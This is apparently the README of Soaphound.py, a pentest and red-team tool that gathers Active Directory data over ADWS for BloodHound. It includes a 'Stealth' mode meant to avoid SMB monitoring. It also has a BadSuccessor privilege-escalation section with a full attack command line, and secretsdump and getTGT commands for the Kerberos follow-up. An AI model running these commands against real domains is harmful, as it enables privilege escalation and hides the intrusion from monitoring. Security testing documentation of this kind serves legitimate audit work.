# Description

While reading [BloodHound.py](https://github.com/dirkjanm/BloodHound.py), a Linux alternative to [SharpHound](https://github.com/SpecterOps/SharpHound), we observed that object collection is performed on a case-by-case basis. Specific conditions are evaluated to determine the most relevant information for each collected object, and tailored actions are taken accordingly.

We sought to follow a similar logic while implementing Soaphound.py, aiming to collect the most valuable information during object enumeration through ADWS. In addition, since user sessions on machines are not collected through LDAP, we reused BloodHound.py's approach to perform this collection.

The tool is currently being improved to cover all specific data collection scenarios. At the time of writing, it is capable of collecting Active Directory objects via the ADWS service and retrieving remote session data similar to what BloodHound.py achieves.

## Collection methods

| Preset | Network ports | AD coverage | Use case |
|---|---|---|---|
| `-c Default` (default) | TCP:9389 (ADWS, including cross-NC referral follow) + TCP:445 (SMB SYSVOL when GPOs are found, plus per-host sessions) | **Full** — all objects, GPO settings, local admins, GPP cpassword, trust risks | Standard pentest, AD audit |
| `-c Stealth` | TCP:9389 only (ADWS + referral follow stays on ADWS) | **Partial** — AD objects only; GPO settings, local admins, cpassword and computer sessions NOT collected | Red Team ops where SMB is blocked or monitored |
| `-c ADWSOnly` | (deprecated alias of Stealth) | Same as Stealth | Backward compatibility, will be removed in v1.5 |

**Note on referrals.** When a cross-naming-context query (for example a trust in another forest partition) returns an `ADWSReferralError`, Soaphound.py opens a new ADWS session on the referred DC. The target URL is formatted as `ldap://<fqdn>/...` by the server, but the client connection stays on TCP:9389 — no native LDAP (TCP:389) traffic is generated.

**Why two modes?** The richest offensive signals (local admins, user rights, GPP cpassword credentials) live in SYSVOL, not in the AD database. A proper reconnaissance requires reading both over ADWS AND over SMB SYSVOL. The Stealth mode exists for the specific case where SMB TCP:445 is unavailable or must stay silent, with the explicit trade-off of a partial output.

More information: [you may check out the short blog post](https://j4s0nmo0n.github.io/belettetimoree.github.io/Soaphound.py%20-%20Collecting%20Active%20Directory%20Objects%20over%20ADWS%20from%20Linux.html)

# Usage
```
 .oooooo..o                                oooo                                                .o8                             
d8P'    `Y8                                `888                                               "888                             
Y88bo.       .ooooo.   .oooo.   oo.ooooo.   888 .oo.    .ooooo.  oooo  oooo  ooo. .oo.    .oooo888      oo.ooooo.  oooo    ooo 
 `"Y8888o.  d88' `88b `P  )88b   888' `88b  888P"Y88b  d88' `88b `888  `888  `888P"Y88b  d88' `888       888' `88b  `88.  .8'  
     `"Y88b 888   888  .oP"888   888   888  888   888  888   888  888   888   888   888  888   888       888   888   `88..8'   
oo     .d8P 888   888 d8(  888   888   888  888   888  888   888  888   888   888   888  888   888  .o.  888   888    `888'    
8""88888P'  `Y8bod8P' `Y888""8o  888bod8P' o888o o888o `Y8bod8P'  `V88V"V8P' o888o o888o `Y8bod88P" Y8P  888bod8P'     .8'     
                                 888                                                                     888       .o..P'      
                                o888o                                                                   o888o      `Y8P'       
                                                                                                    (made by @belettet1m0ree)


usage: soaphound [-h] [-c COLLECTIONMETHOD] -d DOMAIN [-v] [--ts] -u USERNAME
                 [-p PASSWORD] [--hashes HASHES] [-k] [-aesKey HEXKEY]
                 [-dc-ip HOST] -dc HOST [--zip] [-op PREFIX_NAME]
                 [-wk NUM_WORKERS] [--output-dir OUTPUT_DIR]
                 [--cert-find] [--cert-find-force-epa {auto,enabled,disabled}]
                 [--cert-find-skip-web-probe] [--cert-find-ca-rpc]

Python based ingestor for BloodHound using ADWS

options:
  -h, --help            show this help message and exit
  -c, --collectionmethod {Default,Stealth,ADWSOnly}
                        Collection preset. Default: AD objects via ADWS +
                        GPO via SMB SYSVOL (full output). Stealth: ADWS
                        only, TCP:9389 only, no SMB. ADWSOnly: deprecated
                        alias of Stealth, will be removed in v1.5.
  -d, --domain DOMAIN   Domain to query.
  -v                    Enable verbose output.
  --ts                  Add timestamp to logs.

authentication options:
  NTLM authentication is supported using a username/password or NT hash.
  Kerberos authentication is supported through -k using the ccache pointed to
  by KRB5CCNAME.

  -u, --username USERNAME
                        Username. Format: username[@domain].
                        If the domain is unspecified, the current domain is used.
  -p, --password PASSWORD
                        Password.
  --hashes HASHES       LM:NTLM hashes.
  -k, --kerberos        Use Kerberos authentication through the ticket available
                        in the ccache pointed to by KRB5CCNAME.
  -aesKey, --aes-key HEXKEY
                        AES key, 128 or 256 bits, for Kerberos authentication.
                        Used for SMB collection in Default mode.
  -dc-ip, --kdc-ip HOST
                        KDC IP address or hostname. Useful when the ADWS DC and
                        the KDC differ. Defaults to the value provided with -dc.

collection options:
  -dc, --domain-controller HOST
                        DC to query, hostname or FQDN.
  --zip                 Compress the JSON output files into a zip archive.
  -op, --outputprefix PREFIX_NAME
                        String to prepend to output file names.
  -wk, --worker_num NUM_WORKERS
                        Number of workers, default 100.
  --output-dir OUTPUT_DIR
                        Output folder, default current directory.
  --cert-find           Enumerate AD CS certificate templates and CAs like certipy find.
  --cert-find-force-epa {auto,enabled,disabled}
                        Override HTTPS EPA detection for AD CS Web Enrollment: auto, enabled, or disabled.
  --cert-find-skip-web-probe
                        Do not probe HTTP/HTTPS /certsrv/ endpoints AD CS Web Enrollment and ESC8 will not be evaluated.
  --cert-find-ca-rpc    Enrich CA configuration through Remote Registry/RPC:
                        User Specified SAN, Request Disposition, Enforce
                        Encryption, Active Policy.

```

# Installation

## From PyPI (recommended)

```bash
pipx install soaphound-py
soaphound --help
```

> **Note on PyPI namespace** - The official PyPI distribution is **`soaphound-py`** (with the `-py` suffix). A separate package named `soaphound` was published on PyPI on 2026-03-29 by an unrelated third party; **that package is not maintained by this project**. Always install `soaphound-py`.

To upgrade later:
```bash
pipx upgrade soaphound-py
```

## From git (alternative)

```bash
pipx install git+https://github.com/j4s0nmo0n/Soaphound.py
soaphound --help
```

## With `poetry` (development)

```bash
git clone https://github.com/j4s0nmo0n/Soaphound.py
cd Soaphound.py
poetry install
poetry run soaphound --help
```

## With `pip` in a virtualenv

```bash
python3 -m venv ~/venvs/soaphound
source ~/venvs/soaphound/bin/activate
pip install git+https://github.com/j4s0nmo0n/Soaphound.py
```

# Example Usage

Perform ADWS collection with session enumeration

```
soaphound -d jjk.local -u yuji -p SukunaIsAbitch -dc dc-curse --output-dir output
```

Perform Stealth collection (ADWS only, no SMB — skips SYSVOL, local admins, cpassword, computer sessions)

```
soaphound -d jjk.local -u yuji -p SukunaIsAbitch -dc dc-curse --output-dir output -c Stealth
```

Perform ADCS information collection

```
soaphound -d jjk.local -u yuji -p SukunaIsAbitch -dc dc-curse --cert-find --cert-find-force-epa auto
```

# Kerberos authentication (-k)

Soaphound supports Kerberos authentication through the `-k` option and the `KRB5CCNAME` environment variable.

The ccache may contain a valid TGT or a usable service ticket, depending on the collection mode and the operations being performed.

```bash
# Load a Kerberos ticket
export KRB5CCNAME=/tmp/yuji.ccache

# Run Soaphound with Kerberos
soaphound -d jjk.local -u yuji -dc dc-curse.jjk.local -k

# Run Stealth collection with Kerberos (ADWS only, no SMB)
soaphound -d jjk.local -u yuji -dc dc-curse.jjk.local -k -c Stealth

# Let Soaphound extract the username and domain from the ccache
soaphound -dc dc-curse.jjk.local -k -c Stealth

# Use a different KDC
soaphound -d jjk.local -u yuji -dc adws.jjk.local -dc-ip kdc.jjk.local -k
```

# BadSuccessor via ADWS

Soaphound-py ships a CLI entry point for the BadSuccessor technique,
based on the Akamai advisory by Yuval Gordon
([blog post](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)).
Everything the tool does over the wire goes through net.tcp:9389 (ADWS),
so a SIEM that only watches LDAP:389 will not see the three AD writes
involved.

**Prerequisites**

- An account with `Create Child` permission for the
  `msDS-DelegatedManagedServiceAccount` object class on the target OU.
- `Write Property` on both `msDS-ManagedAccountPrecededByLink` and
  `msDS-DelegatedMSAState` on the created dMSA. Default `CREATOR OWNER`
  inheritance does not grant these on hardened OUs; explicit WP
  delegation (`dsacls /I:S /G <user>:WP;<attr>`) is often required.
- The Distinguished Name of the AD principal to supersede.
- At least one Windows Server 2025 Domain Controller in the forest.
- ADWS reachable on `tcp/9389` on that DC.

**Three ADWS writes**

| # | Operation | Endpoint | Payload |
|---|-----------|----------|---------|
| 1 | WS-Transfer Create | `/Windows/ResourceFactory` | Creates the dMSA (`objectClass=msDS-DelegatedManagedServiceAccount`, `sAMAccountName`, `userAccountControl=4096`, `dNSHostName`, `msDS-ManagedPasswordInterval=30`, `msDS-DelegatedMSAState=0`) |
| 2 | WS-Transfer Put | `/Windows/Resource` | Sets `msDS-ManagedAccountPrecededByLink` to the target DN |
| 3 | WS-Transfer Put | `/Windows/Resource` | Sets `msDS-DelegatedMSAState` to `2` (migration completed) |

**CLI**

```
soaphound \
    -d jjk.local \
    -u attacker \
    -p 'password' \
    -dc dc-curse.jjk.local \
    -dc-ip 192.168.56.101 \
    --badsuccessor \
    --target 'CN=testVictim,CN=Users,DC=jjk,DC=local' \
    --dmsa-cn badSuccessor \
    --dmsa-ou 'OU=ControlledOU,DC=jjk,DC=local' \
    [--dry-run] [--rollback]
```

`--dry-run` renders and logs the three SOAP payloads without sending
them, useful for permission-matrix debugging. `--rollback` compensates
a partial run by deleting the dMSA via WS-Transfer Delete; it does not
require `--target`.

**Expected output (happy path)**

```
[*] BadSuccessor via ADWS - target: CN=testVictim,CN=Users,DC=jjk,DC=local
[+] Op 1/3 : dMSA created at CN=badSuccessor,OU=ControlledOU,DC=jjk,DC=local
[+] Op 2/3 : msDS-ManagedAccountPrecededByLink set to CN=testVictim,CN=Users,DC=jjk,DC=local
[+] Op 3/3 : msDS-DelegatedMSAState set to 2
[+] Migration state = 2. dMSA is now ready to supersede target.
```

**Audit trail on the DC**

With a SACL enabled on the target OU, the three writes generate:

- 1x **Event 5137** - Directory Service Object Created (dMSA)
- 2x **Event 5136** - Directory Service Object Modified (one per Put)

**Kerberos handoff (external)**

Once the three ADWS writes have landed, the dMSA is in the migration
state 2 and ready to be used as a superseder. The remaining steps are
performed with Impacket:

```bash
# 1. Recover the dMSA NT hash and AES256 key (requires DCSync-equivalent rights).
secretsdump.py -just-dc-user 'badSuccessor$' \
    -dc-ip 192.168.56.101 'jjk.local/Administrator:<AdminPass>@192.168.56.101'

# 2. Ask the KDC for a TGT on behalf of the dMSA. Modern DCs often
#    disable RC4, so pass the AES256 key rather than the NT hash.
getTGT.py -dc-ip 192.168.56.101 -aesKey <AES256> 'jjk.local/badSuccessor$'

# 3. Inspect the resulting ticket PAC.
describeTicket.py --aes <krbtgt_AES256> 'badSuccessor$.ccache'
```

The KDC-side substitution that materialises the privilege escalation --
where the resulting ticket carries the superseded principal's SIDs via
the `KERB-DMSA-KEY-PACKAGE` or `DMSA_SUPERSEDED_ACCOUNT` PAC buffer --
requires a Kerberos client that implements the dMSA-specific
pre-authentication. On Windows, Rubeus `/dmsa` handles this. On Linux,
Impacket 0.13 does not yet port the dMSA PA-DATA, so the Kerberos
portion of the attack remains Windows-side tooling. Recent Windows
Server 2025 cumulative updates may also harden the KDC against this
substitution, in which case the Impacket-based path returns a plain
ticket for the dMSA itself (visible in `describeTicket` as the dMSA's
own `UserId` RID instead of the target's).

# References

- [Falcon Force Team](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/) for the initial inspiration.
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py), for this amazing implementation of BloodHound ingestor.
- [SOAPy](https://github.com/logangoins/SOAPy) by @_logangoins, whose Kerberos NNS implementation is the basis of the `-k` support.
- [Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-addm/59205cf6-aa8e-4f7e-be57-8b63640bf9a4) for the official protocol documentation.
- [ERNW](https://insinuator.net/2016/08/pentesting-webservices-with-net-tcp-binding/) for the initial boost.
- [X-Force Red](https://www.ibm.com/think/x-force/stealthy-enumeration-of-active-directory-environments-through-adws) for their brilliant implementation of NBFX and research insights.
- [Rabobank Red Team](https://rabobank.jobs/en/techblog/adws-an-unconventional-path-into-active-directory-luc-kolen/) for sharing valuable resources and operational insights.
